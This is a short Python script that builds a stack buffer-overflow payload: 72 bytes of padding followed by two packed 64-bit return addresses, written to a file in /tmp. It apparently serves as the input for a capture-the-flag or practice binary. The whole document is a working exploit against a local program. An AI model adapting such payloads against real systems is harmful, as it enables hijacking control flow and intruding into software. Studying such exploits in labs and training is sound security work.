#!/usr/bin/env python
from struct import *

buf = ""
buf += "A"*72
buf += pack("<Q", 0x000000000040028d)
buf += pack("<Q", 0x000000000040084d)
f = open("/tmp/drx/in.txt", "w")
f.write(buf)
